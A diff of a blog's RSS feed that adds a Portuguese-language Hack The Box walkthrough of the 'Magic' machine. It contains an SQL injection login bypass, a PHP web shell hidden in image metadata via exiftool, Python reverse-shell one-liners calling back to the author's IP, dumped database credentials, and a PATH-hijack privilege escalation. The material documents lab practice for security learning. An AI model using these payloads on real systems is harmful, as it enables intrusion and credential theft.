@@ -7,8 +7,75 @@
     <ttl>1440</ttl>
     <generator>Hugo 0.73.0</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 18 Oct 2020 01:19:11 UT</lastBuildDate>
+    <lastBuildDate>Sun, 18 Oct 2020 02:04:58 UT</lastBuildDate>
     <atom:link href="/htb/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Magic</title>
+      <link>/htb/magic/</link>
+      <pubDate>Sun, 18 Oct 2020 01:38:50 UT</pubDate>
+      <guid>/htb/magic/</guid>
+      <description>nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python3 dirsearch.py -u http://10.10.10.185/ -e *</description>
+      <content:encoded><![CDATA[nmap -sV -sC -Pn -T4 -v -p- 10.10.10.185
+PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA) | 256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA) |_ 256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Magic Portfolio Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel python3 dirsearch.py -u http://10.10.10.185/ -e *
+_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&amp;gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite http://10.10.10.185/login.php explorando o site descobri que o nome das imagens pode conter a respectiva senha.
+http://10.10.10.185/index.php/login/ podemos notar hashs &#43; imagens quebradas. baixei todas as informações da pagina e criei uma wordlist.. vamos ver. encontrei referências de .sql descobertos pelo dirsearch, portanto tentei fazer uma injeção simples de tabela de usuários.
+pesquisei no google: injection sql login.php
+login.php da página que está rodando o brute force (rockyou)
+Para minha surpresa deu certo, no primeiro link.
+https://www.devmedia.com.br/sql-injection-em-ambientes-web/9733
+&#39; or 1=1 -- login/senha
+ele já faz o 301 automatico para url upload
+http://10.10.10.185/upload.php A ideia é de um envenenamento com uma imagem. Vou pesquisar uma aplicação que faça isso, no kali deve ter com ctz &amp;hellip;
+Depois das pesquisas realizadas, encontrei que existe um programa chamado exiftool ele grava informações em metadados em varios tipos de arquivos inclusive mp3, pdf , jpeg etc Não vem nativo no kali linux, é necessário instalar.
+apt-get install exiftool Utilizei essa wiki para consultar as opções dele e as flags utilizadas &amp;gt; https://metacpan.org/pod/exiftool
+Como o site requer uma imagem, optei por uma PNG Ele da suporte de leitura, gravação e escrita PNG r/w/c
+Posso colocar uma linha de escrita dentro do PNG dessa forma, como no exemplo da wiki &amp;gt;
+WRITING EXAMPLES Note that quotes are necessary around arguments which contain certain special characters such as &amp;gt;, &amp;lt; or any white space. These quoting techniques are shell dependent, but the examples below will work for most Unix shells. With the Windows cmd shell however, double quotes should be used (eg. -Comment=&amp;#34;This is a new comment&amp;#34;). exiftool -Comment=&amp;#39;This is a new comment&amp;#39; dst.jpg Write new comment to a JPG image (replaces any existing comment). Pesquisei no google exiftool php shell
+e vi o vídeo desse cara que está destacado
+Ele carrega uma shell para dentro de uma imagem e faz upload no roteador, com isso ganha acesso aos diretorios internos.
+Vou tentar fazer a mesma injeção de código.
+E encontrar um jeito de utilizar o reverse shell para dentro da maquina.. to vendo exemplos funcionais.
+http://sejalivre.org/OSCP/OSCP_Notes--ReverseShell_(all).html
+Encontrei https://github.com/xapax/security/blob/master/bypass_image_upload.md
+Esse é o código que vou usar no exiftool:
+exiftool -Comment=&amp;#39;&amp;lt;?php echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;; system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#39; lo.jpg depois disso renomeio para .php
+mv fxshell.png fxshell.php.png
+continuando ..
+Fiz o upload com sucesso..
+estava pesquisando sobre o nc (netcat) https://www.computerhope.com/unix/nc.htm
+com ele podemos ouvir a porta TCP/UDP no caso aqui, vou colocar o nc escutando na porta 1234 uma conexão
+https://www.speedguide.net/port.php?port=1234
+nc -nlvp 1234
+FLAGS: -n Não faça pesquisas de serviço ou DNS em endereços, nomes de host ou portas especificados. -l Usado para especificar que o nc deve escutar uma conexão de entrada em vez de iniciar uma conexão com um host remoto. É um erro usar esta opção em conjunto com as opções -p, -s ou -z. Além disso, qualquer tempo limite especificado com a opção -w é ignorado. -v Faça nc dar uma saída mais detalhada. -p source_port Especifica a porta de origem que a nc deve usar, sujeita a restrições e disponibilidade de privilégios. agora vou usar aquele famoso shell reverso em python que o professor cansou de falar
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; vamos utilizar este ^
+fiz o teste para ver se o upload da imagem deu certo &amp;gt;
+http://10.10.10.185/images/uploads/fxshell.php.png
+10.10.10.185/images/uploads/fxshell.php.png?cmd=python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.15&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; o codigo ficará assim, mudando apenas meu IP de tunelamento no script em python
+connect to [10.10.14.247] from (UNKNOWN) [10.10.10.185] 52180 /bin/sh: 0: can&amp;#39;t access tty; job control turned off $ agora utilizamos o mesmo modulo do python para escalar privilégios
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+python3 -c &amp;#34;import pty;pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34; Fui procurando alguma informação que me leva-se a escalar privilégios, com o usuário do www-data e então encontrei dados de usuário no arquivo db.php5
+assets db.php5 images index.php login.php logout.php upload.php www-data@ubuntu:/var/www/Magic$ cat db.php5 cat db.php5 &amp;lt;?php class Database { private static $dbName = &amp;#39;Magic&amp;#39; ; private static $dbHost = &amp;#39;localhost&amp;#39; ; private static $dbUsername = &amp;#39;theseus&amp;#39;; private static $dbUserPassword = &amp;#39;iamkingtheseus&amp;#39;; private static $cont = null; public function __construct() { die(&amp;#39;Init function is not allowed&amp;#39;); } Com essas informações de usuário, posso baixar os dados do banco. (dump)
+www-data@ubuntu:/var/www/Magic$ mysqldump --databases Magic -utheseus -piamkingtheseus &amp;lt;qldump --databases Magic -utheseus -piamkingtheseus mysqldump: [Warning] Using a password on the command line interface can be insecure. -- MySQL dump 10.13 Distrib 5.7.29, for Linux (x86_64) -- -- Host: localhost Database: Magic -- ------------------------------------------------------ -- Server version 5.7.29-0ubuntu0.18.04.1 /*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */; /*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */; /*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */; /*!40101 SET NAMES utf8 */; /*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */; /*!40103 SET TIME_ZONE=&amp;#39;&#43;00:00&amp;#39; */; /*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */; /*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */; /*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&amp;#39;NO_AUTO_VALUE_ON_ZERO&amp;#39; */; /*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */; -- -- Current Database: `Magic` -- CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */; USE `Magic`; -- -- Table structure for table `login` -- DROP TABLE IF EXISTS `login`; /*!40101 SET @saved_cs_client = @@character_set_client */; /*!40101 SET character_set_client = utf8 */; CREATE TABLE `login` ( `id` int(6) NOT NULL AUTO_INCREMENT, `username` varchar(50) NOT NULL, `password` varchar(100) NOT NULL, PRIMARY KEY (`id`), UNIQUE KEY `username` (`username`) ) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1; /*!40101 SET character_set_client = @saved_cs_client */; -- -- Dumping data for table `login` -- LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,&amp;#39;admin&amp;#39;,&amp;#39;Th3s3usW4sK1ng&amp;#39;); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; /*!40101 SET SQL_MODE=@OLD_SQL_MODE */; /*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */; /*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */; /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */; /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */; /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */; /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */; Quando eu dei um cat no arquivo db.php5
+Eu descobri o usuário de baixo privilegio da maquina e a senha do banco.
+private static $dbUsername = &amp;#39;theseus&amp;#39;; private static $dbUserPassword = &amp;#39;iamkingtheseus&amp;#39;; Com esses dados, eu fiz um dump no banco passando os mesmos : -u (usuário) -p (senha) como uma conexão comum via banco fazendo isso eu descobri a senha do usuário..
+INSERT INTO `login` VALUES (1,&#39;admin&#39;,&#39;Th3s3usW4sK1ng&#39;); www-data@ubuntu:/var/www/Magic$ su theseus su theseus Password: Th3s3usW4sK1ng theseus@ubuntu:/var/www/Magic$ só pegar a flag de user
+theseus@ubuntu:/home$ cd theseus cd theseus theseus@ubuntu:~$ ls ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt theseus@ubuntu:~$ cat user.txt Para pegar o root, tem um truque do Sysinfo que pode ser encontrado na internet.
+theseus@ubuntu:~$ sysinfo quando rodar esse comando, automaticamente ele trará informações do sistema por que se trata de um binário.
+====================Hardware Info==================== H/W path Device Class Description ===================================================== system VMware Virtual Platform /0 bus 440BX Desktop Reference Platform /0/0 memory 86KiB BIOS /0/1 processor AMD EPYC 7401P 24-Core Processor /0/1/0 memory 16KiB L1 cache /0/1/1 memory 16KiB L1 cache /0/100/17.5 bridge PCI Express Root Port /0/100/17.6 bridge PCI Express Root Port /0/100/17.7 bridge PCI Express Root Port /0/100/18 bridge PCI Express Root Port /0/100/18.1 bridge PCI Express Root Port /0/100/18.2 bridge PCI Express Root Port /0/100/18.3 bridge PCI Express Root Port /0/100/18.4 bridge PCI Express Root Port /0/100/18.5 bridge PCI Express Root Port /0/100/18.6 bridge PCI Express Root Port /0/100/18.7 bridge PCI Express Root Port /0/46 scsi0 storage /0/46/0.0.0 /dev/cdrom disk VMware IDE CDR00 /1 system Dentro do tmp, criei uma pasta root e dentro dela criei o arquivo fdisk por que o fdisk é um dos modulos que o binário chama.
+theseus@ubuntu:/tmp/root$ touch fdisk Depois exporto o path, para ser executado com a váriavel $PATH
+theseus@ubuntu:/tmp/root$ export PATH=/tmp/root:$PATH Agora neste arquivo do fdisk vou jogar aquele shell reverso em python novamente
+theseus@ubuntu:/tmp/root$ cat &amp;gt; fdisk python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.15&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; Agora sim dou as permissões
+chmod 755 fdisk
+OBS &amp;gt; no shell reverso coloco meu IP de tunel e porta
+agora abro um novo terminal
+E uso no netcat novamente para escutar na porta 1234
+kali@kali:nc -nlvp 1234 volto na outra aba do terminal
+e executo o path
+theseus@ubuntu: sysinfo Na outra aba com o netcat ouvindo, vc vai perceber que o binário foi executado elevando seu privilégio para root
+Ncat: Connection from 10.10.10.185:45410. root@ubuntu:/tmp/root# whoami whoami root ]]></content:encoded>
+    </item>
     <item>
       <title>Blunder</title>
       <link>/htb/blunder/</link>
@@ -52,14 +119,6 @@ uma simples linha &amp;gt;
 hugo@blunder:~$ sudo -u#-1 /bin/bash sudo -u#-1 /bin/bash Password: Password120 root@blunder:/home/hugo# root@blunder:/home/hugo# cd /root cd /root root@blunder:/root# ls ls root.txt root@blunder:/root# cat root.txt cat root.txt c5a6c440602c9465a35ba11af04a0910 root@blunder:/root# basta entrar na home do /root
 e visualizar a flag
 ]]></content:encoded>
-    </item>
-    <item>
-      <title>Hack the Box</title>
-      <link>/htb/teste/</link>
-      <pubDate>Sat, 17 Oct 2020 16:29:18 UT</pubDate>
-      <guid>/htb/teste/</guid>
-      <description></description>
-      <content:encoded><![CDATA[]]></content:encoded>
     </item>
   </channel>
 </rss>
